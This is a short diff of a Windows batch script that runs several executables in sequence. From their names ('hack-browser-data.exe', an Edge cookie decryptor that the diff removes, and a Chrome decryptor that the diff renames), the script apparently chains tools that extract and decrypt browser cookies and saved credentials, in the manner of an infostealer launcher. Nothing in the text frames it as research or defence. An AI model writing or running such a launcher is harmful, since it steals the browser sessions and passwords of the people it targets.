@@ -15,13 +15,10 @@ echo Running applications sequentially...
 
 REM Run each exe immediately after the previous one finishes
 
-"%CD%\edge_cookie_decryptor.exe"
-timeout /t 1 /nobreak
-
 "%CD%\hack-browser-data.exe"
 timeout /t 1 /nobreak
 
-"%CD%\chrome_cookie_decryptor.exe"
+"%CD%\chrome_decryptor.exe"
 timeout /t 1 /nobreak
 
 
